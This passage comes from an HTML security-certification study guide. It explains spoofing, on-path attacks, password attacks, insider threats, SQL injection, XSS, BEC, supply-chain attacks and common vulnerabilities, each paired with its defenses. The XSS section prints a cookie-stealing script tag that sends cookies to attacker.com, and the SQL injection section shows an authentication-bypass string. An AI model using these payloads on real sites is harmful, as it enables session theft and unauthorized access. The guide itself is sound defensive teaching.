+      <div class="atk-desc"><strong>Responsible disclosure</strong>: a researcher discovers the vulnerability and reports it privately to the vendor, giving them time to develop a patch before public disclosure. <strong>Full disclosure</strong>: immediate public disclosure to pressure vendors to patch quickly. <strong>Bug bounty programs</strong>: vendors pay researchers to report vulnerabilities privately. Zero-days discovered by nation-state actors or criminal groups may be kept secret for months or years to use as offensive weapons before the vendor becomes aware.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Defense without a patch</div>
+      <div class="atk-desc"><strong>Behavioral/EDR detection</strong> — detect the exploit's behavior even without a signature. <strong>Defense in depth</strong> — network segmentation, least privilege, and application sandboxing limit damage even if a zero-day is successfully exploited. <strong>Attack surface reduction</strong> — disable unused services and features that reduce the number of potential zero-day targets. <strong>Virtual patching</strong> — WAF and IPS rules can block exploitation patterns before the vendor releases a patch.</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">Spoofing</h3>
+
+<div class="atk-card">
+  <div class="atk-header threat">
+    <div>
+      <div class="atk-name">Spoofing</div>
+      <div class="atk-sub">Falsifying identity information — IP address, email sender, caller ID, DNS, MAC address</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-tech">Identity Forgery</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">IP spoofing</div>
+      <div class="atk-desc">Forging the source IP address in a packet header to disguise the true origin or impersonate a trusted host. Used in DDoS amplification attacks (sending requests with the victim's IP as the source, causing DNS/NTP servers to flood the victim with responses) and to bypass IP-based access controls. TCP's 3-way handshake makes IP spoofing difficult for connection-oriented attacks, but UDP-based attacks (DDoS amplification) are highly effective.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Email spoofing</div>
+      <div class="atk-desc">Forging the "From:" field in an email to impersonate a legitimate sender. The underlying SMTP protocol does not inherently authenticate senders. Countermeasures: <strong>SPF</strong> (Sender Policy Framework — specifies which mail servers are authorized to send for a domain), <strong>DKIM</strong> (DomainKeys Identified Mail — cryptographically signs email), and <strong>DMARC</strong> (Domain-based Message Authentication, Reporting, and Conformance — tells receiving mail servers what to do with SPF/DKIM failures).</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Other spoofing types</div>
+      <div class="atk-desc"><strong>Caller ID spoofing</strong> — displaying a different number on the victim's phone (used in vishing). <strong>MAC spoofing</strong> — changing the hardware MAC address to bypass MAC-based access controls or impersonate a trusted device. <strong>DNS spoofing</strong> — providing false DNS responses to redirect users to malicious sites (see On-path attack). <strong>ARP spoofing</strong> — poisoning ARP caches on a LAN to associate the attacker's MAC address with a legitimate IP (enables man-in-the-middle attacks).</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">On-Path Attack (Man-in-the-Middle)</h3>
+
+<div class="atk-card">
+  <div class="atk-header threat">
+    <div>
+      <div class="atk-name">On-Path Attack</div>
+      <div class="atk-sub">Attacker intercepts and potentially alters communications between two parties</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-tech">Interception</span><span class="tag tag-crit">Critical</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">The attack</div>
+      <div class="atk-desc">The attacker positions themselves between two communicating parties — typically a user and a server — and relays (and potentially modifies) all communication. Each party believes they are communicating directly with the other. The attacker can read all traffic (including credentials, session tokens, sensitive data), modify data in transit, or inject new content. Also called a <strong>Man-in-the-Middle (MitM) attack</strong> — "on-path" is the newer gender-neutral term preferred by CompTIA.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">How position is achieved</div>
+      <div class="atk-desc"><strong>ARP poisoning</strong> — poisons ARP cache on LAN to route traffic through attacker's machine. <strong>DNS poisoning</strong> — returns attacker-controlled IP for legitimate domain queries. <strong>Evil twin AP</strong> — routes all wireless traffic through attacker's device. <strong>BGP hijacking</strong> — reroutes internet traffic at the routing protocol level (nation-state level). <strong>SSL stripping</strong> — downgrades HTTPS to HTTP, removing encryption, allowing plaintext interception.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">SSL/TLS protection</div>
+      <div class="atk-desc">Properly implemented TLS (HTTPS) defeats most on-path attacks — the certificate authentication mechanism ensures clients communicate only with servers holding the correct private key. <strong>Certificate warnings</strong> in browsers are the visible sign of a failed on-path attempt to substitute a different certificate. Users must never bypass certificate warnings. <strong>HSTS</strong> (HTTP Strict Transport Security) prevents SSL stripping by requiring HTTPS for future connections.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Countermeasures</div>
+      <div class="atk-desc"><strong>HTTPS everywhere + HSTS</strong>. <strong>VPN</strong> — encrypts all traffic end-to-end, defeating interception at the network level. <strong>Dynamic ARP Inspection (DAI)</strong> on switches prevents ARP poisoning. <strong>DNSSEC</strong> — cryptographically signs DNS responses, preventing DNS spoofing. <strong>Certificate pinning</strong> in applications. <strong>MFA</strong> — even if credentials are intercepted, MFA provides a second factor that the attacker cannot reuse (for time-based OTPs).</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">Brute-Force and Dictionary Attacks</h3>
+
+<div class="atk-card">
+  <div class="atk-header threat">
+    <div>
+      <div class="atk-name">Brute-Force / Dictionary Attack</div>
+      <div class="atk-sub">Systematic password guessing — exhaustive (brute-force) or wordlist-based (dictionary)</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-tech">Credential Attack</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">Brute-force attack</div>
+      <div class="atk-desc">Tries <strong>every possible combination</strong> of characters until the correct password is found. Guaranteed to succeed eventually, but the time required grows exponentially with password length and character set size. An 8-character password using uppercase, lowercase, digits, and symbols has approximately 218 trillion combinations — feasible to crack offline with modern GPU clusters in hours or days. A 16-character random password is essentially infeasible. Time is the variable: brute-force attacks accelerate as hardware improves.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Dictionary attack</div>
+      <div class="atk-desc">Instead of trying all combinations, tries passwords from a <strong>wordlist</strong> (dictionary file) — real words, common passwords ("password123," "qwerty," "Summer2024!"), names, dates, and previously leaked passwords from known data breaches. Dramatically faster than brute-force because most real-world passwords are dictionary words with predictable modifications. Tools like Hashcat use rule-based dictionary attacks (adding numbers to the end, substituting @ for a, etc.) to try millions of variations per second.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Online vs. offline</div>
+      <div class="atk-desc"><strong>Online attacks</strong> — directly attack a login interface; rate-limited by network and server response time; account lockout and CAPTCHA are effective countermeasures. <strong>Offline attacks</strong> — the attacker has obtained the password hash database (from a data breach); hashes are cracked at GPU speed without any network or account lockout constraints. A 100 million hash/second attack cracks most 8-character passwords in seconds offline.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Countermeasures</div>
+      <div class="atk-desc"><strong>Strong passwords / passphrases</strong> — length is more important than complexity; "CorrectHorseBatteryStaple" is stronger than "P@ssw0rd." <strong>Account lockout</strong> — lock account after N failed attempts (defeats online brute-force). <strong>MFA</strong> — a correct password is insufficient without the second factor. <strong>Password hashing</strong> — use bcrypt, Argon2, or scrypt (slow, adaptive hashing algorithms) rather than MD5/SHA-1 for stored passwords, dramatically slowing offline cracking. <strong>Credential stuffing protection</strong> — monitor for login attempts using breach-exposed credentials.</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">Insider Threat</h3>
+
+<div class="atk-card">
+  <div class="atk-header threat">
+    <div>
+      <div class="atk-name">Insider Threat</div>
+      <div class="atk-sub">Malicious or negligent actions by someone with authorized access — employees, contractors, vendors</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-human">Internal</span><span class="tag tag-crit">Hardest to Detect</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">Malicious insider</div>
+      <div class="atk-desc">An authorized person who intentionally uses their access to harm the organization — exfiltrating intellectual property, sabotaging systems, selling credentials to attackers, or facilitating external attacks. Motivations: financial gain, revenge for perceived mistreatment, ideological, coercion by an external attacker, or recruitment by a competitor or nation-state. Malicious insiders are dangerous because they already have legitimate access and know where valuable data lives.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Negligent insider</div>
+      <div class="atk-desc">An authorized person who inadvertently causes a security incident through carelessness rather than malicious intent — clicking a phishing link, emailing sensitive data to a personal account for convenience, losing an unencrypted laptop, using weak passwords, or misconfiguring a cloud storage bucket to public access. Negligent insiders cause the majority of security incidents — not malice, but inattention or poor security hygiene.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Detection challenges</div>
+      <div class="atk-desc">Insiders already have authorized access, so their activities may appear normal. Detecting malicious insiders requires behavioral analytics — identifying deviations from normal activity patterns (accessing files outside normal work hours, mass downloads before resignation, accessing systems outside the user's normal scope). <strong>User and Entity Behavior Analytics (UEBA)</strong> and DLP tools help detect anomalous patterns.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Countermeasures</div>
+      <div class="atk-desc"><strong>Least privilege</strong> — users have access only to what they need, limiting the scope of potential damage. <strong>Separation of duties</strong> — no single person can complete a sensitive transaction alone (e.g., both initiating and approving a wire transfer). <strong>Mandatory vacation</strong> — forces someone else to cover duties, often revealing hidden malicious activity. <strong>Offboarding procedures</strong> — immediately revoke all access upon departure. <strong>Background checks</strong> before hire. <strong>Activity logging and monitoring</strong> — all privileged actions logged and reviewed.</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">SQL Injection</h3>
+
+<div class="atk-card">
+  <div class="atk-header threat">
+    <div>
+      <div class="atk-name">SQL Injection (SQLi)</div>
+      <div class="atk-sub">Inserting malicious SQL into input fields to manipulate a database</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-tech">Web App</span><span class="tag tag-high">Data Breach</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">How it works</div>
+      <div class="atk-desc">A web application takes user input (a search field, login form, URL parameter) and incorporates it directly into a SQL query without proper sanitization. An attacker inputs specially crafted SQL code instead of the expected data. The database executes the injected SQL, potentially returning all records from a table, bypassing authentication, modifying or deleting data, or reading files from the server's filesystem. The classic example: entering <code>' OR '1'='1</code> into a login form's password field can bypass authentication in a vulnerable application.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Example (conceptual)</div>
+      <div class="atk-desc">A legitimate query built from user input might look like:<br><br>
+      <code>SELECT * FROM users WHERE username='admin' AND password='[input]'</code><br><br>
+      If the attacker enters <code>' OR '1'='1' --</code> as the password, the query becomes:<br><br>
+      <code>SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1' --'</code><br><br>
+      The <code>OR '1'='1'</code> always evaluates to true; the <code>--</code> comments out the rest. The query returns the admin record regardless of the password.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Impact</div>
+      <div class="atk-desc">Authentication bypass; dumping entire database contents (usernames, passwords, credit cards, PII); modifying data; deleting records; in some configurations, reading files from the filesystem or executing OS commands. SQL injection has been responsible for some of the largest data breaches in history.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Prevention</div>
+      <div class="atk-desc"><strong>Parameterized queries / prepared statements</strong> — the definitive fix; separates SQL code from data, making injection impossible. <strong>Input validation</strong> — reject unexpected characters. <strong>Principle of least privilege</strong> for database accounts — the application's database account should not have DROP or administrative privileges. <strong>WAF (Web Application Firewall)</strong> — detects and blocks common SQLi patterns as a defensive layer.</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">Cross-Site Scripting (XSS)</h3>
+
+<div class="atk-card">
+  <div class="atk-header threat">
+    <div>
+      <div class="atk-name">Cross-Site Scripting (XSS)</div>
+      <div class="atk-sub">Injecting malicious scripts into web pages viewed by other users</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-tech">Web App</span><span class="tag tag-high">Session Theft</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">How it works</div>
+      <div class="atk-desc">An attacker injects malicious JavaScript into a web page that is then served to and executed by other users' browsers. Unlike SQL injection (which attacks the database), XSS attacks the users who view the compromised page. The injected script runs in the context of the legitimate website — it has the same access to the user's session cookies, local storage, and DOM as the legitimate page's own JavaScript.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Stored XSS (Persistent)</div>
+      <div class="atk-desc">The attacker's malicious script is stored in the application's database (e.g., submitted in a comment field, user profile bio, or forum post) and is served to every user who views that page. The attacker submits <code>&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code> in a comment — every user who reads that comment page has their session cookie silently exfiltrated to the attacker.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Reflected XSS</div>
+      <div class="atk-desc">The malicious script is embedded in a URL crafted by the attacker and sent to the victim (via email, message, etc.). When the victim clicks the link and the server reflects the malicious parameter back in the response page, the script executes. The malicious script is not stored on the server — it is only present in the URL. Less persistent but easier to deploy.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Impact and prevention</div>
+      <div class="atk-desc"><strong>Impact:</strong> session hijacking (stealing cookies to impersonate the user), credential harvesting via injected fake login forms, malware delivery, defacement, keylogging. <strong>Prevention:</strong> <strong>Output encoding</strong> — encode special characters before rendering user-supplied content as HTML (converts <code>&lt;</code> to <code>&amp;lt;</code>). <strong>Content Security Policy (CSP)</strong> — browser header restricting which scripts are allowed to execute. <strong>HTTPOnly cookies</strong> — prevent JavaScript from accessing session cookies.</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">Business Email Compromise (BEC)</h3>
+
+<div class="atk-card">
+  <div class="atk-header threat">
+    <div>
+      <div class="atk-name">Business Email Compromise (BEC)</div>
+      <div class="atk-sub">Impersonating executives or vendors to authorize fraudulent financial transactions</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-human">Social Engineering</span><span class="tag tag-crit">Financial Fraud</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">The attack</div>
+      <div class="atk-desc">An attacker impersonates a CEO, CFO, or trusted vendor via email to trick an employee (typically in finance or accounting) into transferring funds to an attacker-controlled account, or into changing vendor payment banking details. The FBI consistently identifies BEC as the highest-dollar cybercrime category — billions of dollars lost annually. The attack is pure social engineering — no malware, no technical vulnerability in most cases.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Common scenarios</div>
+      <div class="atk-desc"><strong>CEO fraud</strong>: CFO receives an urgent email from "the CEO" requesting an immediate wire transfer for a confidential acquisition. <strong>Vendor invoice fraud</strong>: a real vendor's email is compromised (or spoofed), and the company receives an invoice with updated banking details. <strong>W-2 phishing</strong>: attacker impersonates HR requesting all employee W-2 forms for tax purposes. <strong>Attorney impersonation</strong>: attacker poses as an attorney for a time-sensitive legal matter requiring an immediate payment.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Technical enablers</div>
+      <div class="atk-desc">Email account compromise (the real account is taken over after a phishing attack, giving the attacker control of authentic email); email spoofing (SPF/DKIM/DMARC weaknesses or failure to configure them); lookalike domains (company-n4me.com instead of company-name.com); display name spoofing (the "From" display name says "CEO Name" but the actual address is ceo@gmail.com).</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Countermeasures</div>
+      <div class="atk-desc"><strong>Out-of-band verification</strong> — any financial request received by email must be verbally confirmed by calling a known, pre-established phone number (not a number provided in the email). <strong>Multi-person approval</strong> for wire transfers above a threshold. <strong>Email security gateway</strong> with BEC detection. <strong>DMARC enforcement</strong> — reject email that fails SPF/DKIM validation from your domain. <strong>Training</strong> — finance staff specifically trained to recognize BEC patterns and required to follow verification procedures regardless of urgency.</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">Supply Chain / Pipeline Attack</h3>
+
+<div class="atk-card">
+  <div class="atk-header threat">
+    <div>
+      <div class="atk-name">Supply Chain / Pipeline Attack</div>
+      <div class="atk-sub">Compromising a trusted vendor, supplier, or software build process to reach the ultimate target</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-tech">Indirect</span><span class="tag tag-crit">Systemic Risk</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">The concept</div>
+      <div class="atk-desc">Rather than attacking the target directly, the attacker compromises a <strong>trusted supplier, software vendor, or development pipeline</strong> whose products are used by the target. The target's defenses are bypassed because the malicious code arrives as a trusted, signed update from a vendor the organization explicitly trusts. The target organization becomes collateral damage from the vendor's compromise.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">SolarWinds (2020)</div>
+      <div class="atk-desc">The most prominent example: attackers compromised the build pipeline of SolarWinds' Orion IT monitoring software. A malicious backdoor (SUNBURST) was compiled into a legitimate signed software update and distributed to approximately 18,000 SolarWinds customers — including U.S. government agencies and major enterprises — who trusted and installed the update as part of normal operations. The attack remained undetected for months.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Software pipeline attacks</div>
+      <div class="atk-desc">Compromising the <strong>CI/CD (Continuous Integration / Continuous Deployment) pipeline</strong> — the automated system that builds, tests, and deploys software. If an attacker can inject malicious code into the build process, the resulting software artifacts contain the malicious code and are signed with the vendor's legitimate certificate. Open-source dependency confusion attacks inject malicious packages into public repositories that have names similar to private packages, tricking automated build systems into downloading malicious code.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Countermeasures</div>
+      <div class="atk-desc"><strong>Vendor security assessment</strong> — evaluate suppliers' security practices before trusting their products. <strong>Software Bill of Materials (SBOM)</strong> — maintain a list of all software components and their sources; monitor for compromise notifications. <strong>Code signing verification</strong> — verify digital signatures on software before installation. <strong>Behavioral monitoring after updates</strong> — watch for anomalous behavior after software updates. <strong>Zero Trust</strong> — even trusted vendor software operates with minimum necessary privileges.</div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- SECTION 3: VULNERABILITIES               -->
+<!-- ══════════════════════════════════════════ -->
+<h2 class="chapter"><span class="ch-num">SECTION 3</span>Vulnerabilities</h2>
+
+<p><span class="key-term">Vulnerabilities</span> are weaknesses in systems, configurations, policies, or processes that threats can exploit. Where threats are the attacks, vulnerabilities are the conditions that make those attacks possible or successful. A well-configured, fully patched, compliant system with appropriate controls reduces the attack surface that threats can exploit.</p>
+
+<div class="vuln-panel">
+  <div class="vuln-panel-head">
+    <span class="vuln-panel-title">System and Configuration Vulnerabilities</span>
+  </div>
+
+  <div class="vuln-row">
+    <div class="vuln-label">Non-Compliant Systems</div>
+    <div class="vuln-desc">Systems that deviate from established <strong>security baselines</strong>, configuration standards, or compliance frameworks (CIS Benchmarks, NIST, PCI-DSS, HIPAA, SOX). Non-compliance may include: disabled audit logging, disabled firewall, insecure protocol still enabled (SMBv1, TelNet), default administrator credentials not changed, missing encryption, or unauthorized software installed. Non-compliant systems represent a gap between the security standard the organization has defined and the actual security posture of the system.<br><br><strong>Detection:</strong> Configuration Management tools, compliance scanners (Nessus, Qualys, Microsoft Secure Score), endpoint management platforms (Intune, SCCM) continuously assess and report compliance status. <strong>Remediation:</strong> automated remediation via Group Policy or MDM, manual hardening, re-imaging non-compliant systems.</div>
+  </div>
+
+  <div class="vuln-row">
+    <div class="vuln-label">Unpatched Systems</div>
+    <div class="vuln-desc">Systems that have not received available security updates — leaving known, publicly disclosed vulnerabilities open for exploitation. When a security patch is released, the vendor simultaneously discloses the vulnerability it fixes. This disclosure is a roadmap for attackers: they know the vulnerability, know what systems are affected, and know that unpatched systems remain exploitable.<br><br>The interval between patch release and attacker exploitation is shrinking — <strong>patch weaponization</strong> (creating exploit code from a disclosed patch) can occur within hours to days of a patch release. Unpatched systems are the most common exploited condition in security incidents. <strong>Patch management</strong> processes should target critical patches within 24–72 hours and all security patches within 30 days.</div>
+  </div>
+
+  <div class="vuln-row">
+    <div class="vuln-label">Unprotected Systems</div>
+    <div class="vuln-desc">Systems lacking <strong>endpoint security controls</strong> — no active antivirus, no software firewall, or both. An unprotected endpoint is exposed to all threats that these controls would otherwise block or alert on.<br><br><strong>Missing antivirus:</strong> malware can execute, persist, and operate without detection or quarantine. <strong>Missing firewall:</strong> unsolicited inbound connections can reach the system; malware that reaches the system can communicate freely with C2 servers. <strong>Windows Security Center</strong> monitors the state of both controls and displays alerts when either is absent or disabled. Endpoint management platforms enforce these controls via policy — a non-compliant endpoint (firewall off, AV expired) can be automatically quarantined from the network until remediated.</div>
+  </div>
+
+  <div class="vuln-row">
+    <div class="vuln-label">End of Life (EOL)</div>
+    <div class="vuln-desc"><strong>End-of-life (EOL)</strong> means the vendor has ceased all development and support for the software or hardware — no more security patches will ever be released, regardless of how many vulnerabilities are discovered. An EOL system that has known vulnerabilities will remain permanently vulnerable; those vulnerabilities can never be patched.<br><br>Examples: Windows 7 (EOL January 2020), Windows Server 2012 R2 (EOL October 2023), Internet Explorer 11 (EOL June 2022). <strong>Running EOL systems in production is one of the highest-risk vulnerability categories</strong> because any newly discovered vulnerability cannot be remediated through patching. Mitigations include: network isolation, compensating controls (additional firewall rules, application whitelisting), and accelerated migration planning. The only real solution is replacement.</div>
+  </div>
+
+  <div class="vuln-row">
+    <div class="vuln-label">BYOD (Bring Your Own Device)</div>
+    <div class="vuln-desc"><strong>Bring Your Own Device</strong> policies allow employees to use personal devices (smartphones, tablets, laptops) to access corporate resources. BYOD creates a vulnerability because personal devices are often:<br><br>• Not managed by corporate IT (no MDM, no enforced encryption, no remote wipe capability)<br>• Running outdated OS versions the user has not updated<br>• Lacking endpoint security software<br>• Shared with family members (including children) who may install risky software<br>• Connected to untrusted home/public Wi-Fi networks<br>• Mixing corporate data with personal data, complicating DLP enforcement<br><br><strong>BYOD mitigations:</strong> MDM enrollment (with employee consent and clear privacy disclosure), containerized corporate apps (separate corporate data from personal data), conditional access policies (block access from non-compliant devices), and minimum security requirements as a condition of corporate access. Organizations must balance security requirements with employee privacy expectations on personal devices.</div>
+  </div>
+</div>
+
+<div class="callout callout-exam">
+  <p class="callout-title">Exam Focus — EOL vs. Unpatched</p>
+  <p>These are related but distinct: an <strong>unpatched</strong> system has available patches that have not been applied — this is fixable. An <strong>EOL</strong> system has no patches available because the vendor no longer provides them — this is not fixable through the normal patch process. An EOL system is perpetually unpatched for any vulnerability discovered after EOL. The risk profile of EOL is therefore worse than unpatched, and the remediation path is replacement rather than patching.</p>
+</div>
+
+
+<!-- QUICK REFERENCE TABLE -->
+<h2 class="chapter"><span class="ch-num">REFERENCE</span>Complete Attack and Threat Quick Reference</h2>
+
+<table class="data-table">
+  <thead>
+    <tr>
+      <th>Attack / Threat</th>
+      <th>Category</th>
+      <th>Target</th>
+      <th>Key Distinguisher</th>
+      <th>Primary Defense</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td>Phishing</td><td>Social Eng.</td><td>People</td><td>Mass deceptive email</td><td>Email gateway, user training</td></tr>
+    <tr><td>Vishing</td><td>Social Eng.</td><td>People</td><td>Voice/phone calls</td><td>Verification procedures, training</td></tr>
+    <tr><td>Smishing</td><td>Social Eng.</td><td>People</td><td>SMS text messages</td><td>Don't click unsolicited links, training</td></tr>
+    <tr><td>QR code phishing</td><td>Social Eng.</td><td>People</td><td>Malicious QR codes replacing legitimate</td><td>Verify QR destination before acting</td></tr>
+    <tr><td>Spear phishing</td><td>Social Eng.</td><td>Specific individual</td><td>Personalized with researched details</td><td>Training, email gateway, MFA</td></tr>
+    <tr><td>Whaling</td><td>Social Eng.</td><td>Executives (C-suite)</td><td>Spear phishing targeting senior leadership</td><td>Executive-specific training, OOB verification</td></tr>
+    <tr><td>Shoulder surfing</td><td>Social Eng.</td><td>People / credentials</td><td>Visual observation of sensitive data entry</td><td>Privacy screen, body positioning</td></tr>
+    <tr><td>Tailgating</td><td>Social Eng.</td><td>Physical access</td><td>Following authorized person through door</td><td>Vestibule/mantrap, security culture</td></tr>
+    <tr><td>Impersonation</td><td>Social Eng.</td><td>Trust exploitation</td><td>Pretending to be trusted authority</td><td>Verification, visitor management</td></tr>
+    <tr><td>Dumpster diving</td><td>Social Eng.</td><td>Physical info</td><td>Searching discarded materials</td><td>Cross-cut shredding, media destruction</td></tr>
+    <tr><td>DoS</td><td>Threat</td><td>Availability</td><td>Single source overwhelms target</td><td>Firewall, rate limiting, ISP filtering</td></tr>
+    <tr><td>DDoS</td><td>Threat</td><td>Availability</td><td>Botnet — thousands of sources</td><td>DDoS protection service (Cloudflare)</td></tr>
+    <tr><td>Evil twin</td><td>Threat</td><td>Wi-Fi users</td><td>Rogue AP with matching SSID</td><td>VPN, 802.1X enterprise Wi-Fi</td></tr>
+    <tr><td>Zero-day</td><td>Threat</td><td>Unpatched vuln</td><td>No patch exists; unknown to vendor</td><td>Behavioral detection, defense in depth</td></tr>
+    <tr><td>Spoofing</td><td>Threat</td><td>Identity trust</td><td>Forges IP / email / caller ID / DNS</td><td>SPF/DKIM/DMARC, DAI, DNSSEC</td></tr>
+    <tr><td>On-path (MitM)</td><td>Threat</td><td>Communications</td><td>Positioned between two parties</td><td>TLS/HTTPS, HSTS, VPN</td></tr>
+    <tr><td>Brute-force</td><td>Threat</td><td>Passwords</td><td>Try every possible combination</td><td>Long passwords, lockout, MFA</td></tr>
+    <tr><td>Dictionary attack</td><td>Threat</td><td>Passwords</td><td>Try wordlist of common/known passwords</td><td>Unique complex passwords, MFA</td></tr>
+    <tr><td>Insider threat</td><td>Threat</td><td>Internal assets</td><td>Authorized user — malicious or negligent</td><td>Least privilege, UEBA, separation of duties</td></tr>
+    <tr><td>SQL injection</td><td>Threat</td><td>Web app databases</td><td>SQL code in input fields manipulates DB</td><td>Parameterized queries, input validation</td></tr>
+    <tr><td>XSS</td><td>Threat</td><td>Web app users</td><td>Malicious JS served to other users' browsers</td><td>Output encoding, CSP, HTTPOnly cookies</td></tr>
+    <tr><td>BEC</td><td>Threat</td><td>Finance / HR</td><td>Executive/vendor impersonation for wire fraud</td><td>OOB verification, multi-person approval</td></tr>
+    <tr><td>Supply chain</td><td>Threat</td><td>Vendor trust</td><td>Compromise trusted supplier to reach target</td><td>Vendor assessment, SBOM, Zero Trust</td></tr>
+    <tr><td>Non-compliant systems</td><td>Vulnerability</td><td>Configuration</td><td>Deviates from security baseline</td><td>Compliance scanning, auto-remediation</td></tr>
+    <tr><td>Unpatched systems</td><td>Vulnerability</td><td>Known CVEs</td><td>Available patches not applied</td><td>Patch management — critical patches 24–72h</td></tr>
+    <tr><td>Unprotected (no AV/FW)</td><td>Vulnerability</td><td>Endpoint</td><td>Missing endpoint security controls</td><td>MDM enforcement, NAC quarantine</td></tr>
+    <tr><td>End of Life (EOL)</td><td>Vulnerability</td><td>Legacy systems</td><td>No patches ever — permanent vulnerability</td><td>Replace; isolate; compensating controls</td></tr>
+    <tr><td>BYOD</td><td>Vulnerability</td><td>Mobile/personal</td><td>Unmanaged personal devices accessing corp data</td><td>MDM, container apps, conditional access</td></tr>
+  </tbody>
+</table>
+
+
+<div class="ch-divider"></div>
+
+<div class="summary-box">
+  <h3>Objective 2.5 — Key Facts Summary</h3>
+  <div class="summary-grid">
+    <div class="summary-item"><span class="s-sym">Phishing types</span>Email=Phishing; Phone=Vishing; SMS=Smishing; QR code; Targeted=Spear; Executive=Whaling</div>
+    <div class="summary-item"><span class="s-sym">Whaling</span>Spear phishing targeting C-suite; highest financial impact; wire fraud / fake legal subpoenas</div>
+    <div class="summary-item"><span class="s-sym">Shoulder surfing</span>Visual eavesdropping; fix = privacy screen, position awareness</div>
+    <div class="summary-item"><span class="s-sym">Tailgating</span>Following through a secured door; fix = vestibule/mantrap; one person per auth</div>
+    <div class="summary-item"><span class="s-sym">Dumpster diving</span>Discarded documents/media; fix = cross-cut shredding, proper media destruction</div>
+    <div class="summary-item"><span class="s-sym">DoS vs. DDoS</span>DoS = single source; DDoS = botnet, thousands of sources, much harder to block</div>
+    <div class="summary-item"><span class="s-sym">Evil twin</span>Rogue AP matching SSID; intercepts traffic; VPN and 802.1X are defenses</div>
+    <div class="summary-item"><span class="s-sym">Zero-day</span>Unknown to vendor; no patch exists; behavioral detection / defense in depth required</div>
+    <div class="summary-item"><span class="s-sym">On-path (MitM)</span>Intercepts communications between two parties; HTTPS/HSTS/VPN prevent</div>
+    <div class="summary-item"><span class="s-sym">Brute-force vs. dictionary</span>Brute = all combinations; dictionary = wordlist; both defeated by length + MFA</div>
+    <div class="summary-item"><span class="s-sym">SQL injection</span>SQL in input fields manipulates DB; fix = parameterized queries</div>
+    <div class="summary-item"><span class="s-sym">XSS</span>JavaScript injected into pages served to other users; fix = output encoding + CSP</div>
+    <div class="summary-item"><span class="s-sym">BEC</span>Impersonate exec/vendor for wire fraud; fix = OOB phone verification before transferring</div>
+    <div class="summary-item"><span class="s-sym">Supply chain</span>Compromise trusted vendor to reach target (SolarWinds); Zero Trust limits blast radius</div>
+    <div class="summary-item"><span class="s-sym">Insider threat</span>Malicious (intentional) or negligent; least privilege + separation of duties + logging</div>
+    <div class="summary-item"><span class="s-sym">Non-compliant</span>Deviates from security baseline; detected by compliance scanners</div>
+    <div class="summary-item"><span class="s-sym">Unpatched</span>Available patches not applied; fix = patch management within 24–72h for critical</div>
+    <div class="summary-item"><span class="s-sym">EOL</span>No future patches EVER; worse than unpatched; only real fix = replacement</div>
+    <div class="summary-item"><span class="s-sym">BYOD</span>Unmanaged personal devices; MDM + containerization + conditional access policies</div>
+    <div class="summary-item"><span class="s-sym">Spoofing</span>Forged identity (IP/email/caller ID); SPF+DKIM+DMARC for email; DAI for ARP</div>
+  </div>
+</div>
+
+<div class="callout callout-exam">
+  <p class="callout-title">High-Probability Exam Scenarios</p>
+  <p><strong>Scenario 1:</strong> A user gets a phone call from "IT support" asking for their password → Vishing. IT will never ask for your password by phone.<br>
+  <strong>Scenario 2:</strong> A finance employee receives an urgent email from the "CEO" requesting a $50,000 wire transfer → BEC/Whaling. Verify via a pre-established phone number before acting.<br>
